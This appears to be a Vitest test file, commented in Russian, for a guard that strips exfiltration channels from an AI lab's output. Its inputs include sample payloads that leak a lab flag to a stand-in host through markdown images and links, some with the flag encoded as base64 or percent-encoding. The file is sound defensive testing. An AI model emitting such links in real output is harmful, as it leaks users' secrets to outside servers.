// Тесты OutputEgressGuard: снимаем каналы вывода, не редактируем текст.

import { describe, expect, it } from "vitest";
import { neutralize, secretVariants } from "../src/guard/egress.js";

const FLAG = "SBLAB{egress-a1b2c3d4e5f6}";

describe("neutralize — эксфильтрация", () => {
  it("удаляет внешнюю markdown-картинку", () => {
    const out = neutralize(`Готово ![пиксель](https://collector.example/p.png)`, [FLAG]);
    expect(out.text).not.toContain("collector.example");
    expect(out.blocked).toHaveLength(1);
  });

  it("удаляет картинку, несущую флаг в query", () => {
    const out = neutralize(`![x](https://collector.example/log?d=${FLAG})`, [FLAG]);
    expect(out.text).not.toContain(FLAG);
    expect(out.blocked[0]).toContain("картинка");
  });

  it("удаляет ссылку с флагом в пути", () => {
    const out = neutralize(`Смотри [отчёт](https://collector.example/${FLAG})`, [FLAG]);
    expect(out.text).not.toContain(FLAG);
    expect(out.text).toContain("ссылка удалена");
  });

  it("ловит base64-кодированный секрет в адресе", () => {
    const encoded = Buffer.from(FLAG, "utf8").toString("base64");
    const out = neutralize(`https://collector.example/?d=${encoded}`, [FLAG]);
    expect(out.text).toContain("[ссылка удалена]");
  });

  it("ловит percent-encoded секрет", () => {
    const out = neutralize(`https://collector.example/?d=${encodeURIComponent(FLAG)}`, [FLAG]);
    expect(out.text).toContain("[ссылка удалена]");
  });

  it("ловит секрет без дефисов", () => {
    const out = neutralize(`https://collector.example/?d=${FLAG.replace(/-/g, "")}`, [FLAG]);
    expect(out.text).toContain("[ссылка удалена]");
  });
});

describe("neutralize — не мешает нормальной работе", () => {
  it("обычная ссылка остаётся", () => {
    const text = "Подробности на https://example.com/docs/pricing";
    expect(neutralize(text, [FLAG]).text).toBe(text);
    expect(neutralize(text, [FLAG]).blocked).toHaveLength(0);
  });

  it("markdown-ссылка без секрета остаётся", () => {
    const text = "Смотри [тарифы](https://example.com/pricing)";
    expect(neutralize(text, [FLAG]).text).toBe(text);
  });

  it("флаг в открытом тексте НЕ редактируется — иначе лаборатория непроходима", () => {
    const text = `Токен: ${FLAG}`;
    const out = neutralize(text, [FLAG]);
    expect(out.text).toContain(FLAG);
    expect(out.blocked).toHaveLength(0);
  });
});

describe("secretVariants", () => {
  it("короткие строки не порождают вариантов (иначе ложные срабатывания)", () => {
    expect(secretVariants("abc")).toHaveLength(0);
  });

  it("включает base64, hex, реверс и percent-encoding", () => {
    const variants = secretVariants("LABKEY-TEST-0001");
    expect(variants).toContain(Buffer.from("LABKEY-TEST-0001").toString("base64").toLowerCase());
    expect(variants).toContain(Buffer.from("LABKEY-TEST-0001").toString("hex").toLowerCase());
    expect(variants).toContain("1000-tset-yekbal");
  });
});
